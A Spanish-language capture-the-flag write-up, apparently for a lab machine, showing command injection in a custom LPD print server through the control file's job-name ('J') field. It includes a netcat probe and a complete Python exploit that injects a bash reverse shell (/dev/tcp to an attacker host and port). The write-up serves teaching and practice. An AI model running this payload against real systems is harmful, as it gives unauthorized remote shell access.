El [RFC 1179](https://datatracker.ietf.org/doc/html/rfc1179) muestra como interactuar con el protocolo. El código indica que se le pueden enviar comandos como `2`, `3` o `4`. El RFC indica que *All commands begin with a single octet code, which is a binary number which represents the requested function.  The code is immediately followed by the ASCII name of the printer queue name on which the function is to be performed.*.

No hace falta enviar el nombre de la cola de impresión, el código ya acepta el comando si envíamos solo el código del octeto que representa la función solicitada. Tal como indica el código recibimos la respuesta del servicio a la función solicitada.

```bash
printf '\x03' | nc paperwork.htb 1515
```


El script que levanta el servidor tiene una vulnerabilidad que permite ejecutar comandos. Recibe un trabajo de impresión enviado por el cliente. Dentro del archivo de control busca una línea que empiece con `J`, todo lo que venga después de `J` se guarda en la variable `job_name`, esa variable se puede controlar y se inserta directamente en un comando del sistema `f"echo 'Archive: {job_name}' >> /tmp/archive.log"` y se ejecuta con `shell=True`.

```python
job_name = "Unknown"
for line in decoded_content.split('\n'):
```

Para obtener una reverse shell aprovechando la ejecución de comandos creamos un script en Python

```python
import argparse
import socket

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="Attacker IP")
parser.add_argument("lport", type=int, help="Attacker port")
args = parser.parse_args()

s = socket.create_connection(("paperwork.htb", 1515))

s.sendall(b"\x02archive\n")
print("queue:", s.recv(1))

payload = (f"J';bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1';#\n").encode()

header = b"\x02" + str(len(payload)).encode() + b" cfA001\n"

s.sendall(header)
print("header:", s.recv(1))

s.sendall(payload)

s.sendall(b"\x00")

s.settimeout(2)
try:
    while True:
        print("recv:", s.recv(1024))
except socket.timeout:
    print("timeout")
```
